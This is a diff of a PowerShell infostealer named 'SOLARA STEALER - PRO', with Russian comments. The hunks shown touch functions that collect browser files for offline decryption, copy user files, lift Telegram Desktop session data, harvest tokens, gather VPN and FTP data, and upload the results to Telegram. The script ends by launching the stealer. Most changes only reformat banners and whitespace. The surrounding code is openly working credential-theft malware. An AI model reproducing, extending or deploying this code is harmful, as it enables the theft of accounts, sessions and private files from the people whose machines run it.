@@ -1,14 +1,14 @@
 # =================================================================================================
 # ||                                                                                             ||
-# ||                                  SOLARA STEALER - PRO                                       ||
+# ||                                  SOLARA STEALER - PRO                                      ||
 # ||                                                                                             ||
-# ||                         Cкрипт для сбора данных и отправки в Telegram.                      ||
-# ||                                                                                             ||
+# ||      Расширенная версия скрипта для сбора данных и отправки в Telegram.                   ||
+# ||                Поддержка расширенного списка браузеров и ПО.                               ||
 # ||                                                                                             ||
 # =================================================================================================
 
 # -------------------------------------------------------------------------------------------------
-# |                                         КОНФИГУРАЦИЯ                                          |
+# |                                         КОНФИГУРАЦИЯ                                        |
 # -------------------------------------------------------------------------------------------------
 
 # --- Конфигурация Telegram ---
@@ -49,7 +49,7 @@ $OutputMessages = @{
 }
 
 # -------------------------------------------------------------------------------------------------
-# |                                    ИСПОЛНЯЕМЫЙ КОД (НЕ ТРОГАТЬ)                               |
+# |                                    ИСПОЛНЯЕМЫЙ КОД (НЕ ТРОГАТЬ)                            |
 # -------------------------------------------------------------------------------------------------
 
 function Start-Stealer {
@@ -269,7 +269,6 @@ function Get-BrowserFiles {
     "Files for offline decryption have been collected." | Out-File "$LogPath\readme.txt"
 }
 
-
 function Copy-UserFiles {
     param($LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
@@ -310,12 +309,12 @@ function Get-MessengerData {
     param($LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
     
-    # Telegram
+    # Telegram - ИСПРАВЛЕНО: используем -Exclude вместо -Filter
     try {
         $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
         if (Test-Path $tgPath) {
-            # Используем Exclude вместо Filter для исключения папок
-            Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") `
+            Copy-Item -Path $tgPath `
+                -Destination (Join-Path $LogPath "Telegram") `
                 -Recurse -Force `
                 -Exclude "user_data*", "cache*" `
                 -ErrorAction SilentlyContinue
@@ -331,8 +330,6 @@ function Get-MessengerData {
         }
     }
 }
-
-
 
 function Get-Tokens {
     param($LogPath, $BrowserProfiles)
@@ -360,7 +357,6 @@ function Get-Tokens {
     }
     $foundTokens | Out-File "$LogPath\Tokens.txt"
 }
-
 
 function Get-VpnFtpData {
     param($LogPath)
@@ -408,4 +404,3 @@ function Send-TelegramFile {
 
 # --- Запуск основной функции ---
 Start-Stealer
-
